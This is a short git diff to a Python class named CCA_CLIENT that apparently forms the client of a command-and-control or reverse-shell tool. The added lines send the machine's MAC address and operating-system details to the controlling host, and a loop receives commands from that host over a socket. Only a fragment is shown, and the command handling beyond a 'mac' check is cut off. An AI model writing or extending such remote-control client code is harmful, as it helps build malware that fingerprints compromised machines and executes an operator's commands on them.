@@ -50,6 +50,9 @@ class CCA_CLIENT:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((self.host, self.port))
+                sock.send(MAC_ADDRESS.encode())
+                sock.recv(1024)
+                sock.send(f"{PLATFORM['system']} {PLATFORM['release']}".encode())
                 print(f"[*] Connected to host {self.host}:{self.port}")
                 break
             except:
@@ -58,6 +61,7 @@ class CCA_CLIENT:
 
     def execute(self):
         while True:
+            
             command = sock.recv(BUF_SIZE).decode()
 
             if command == "mac":
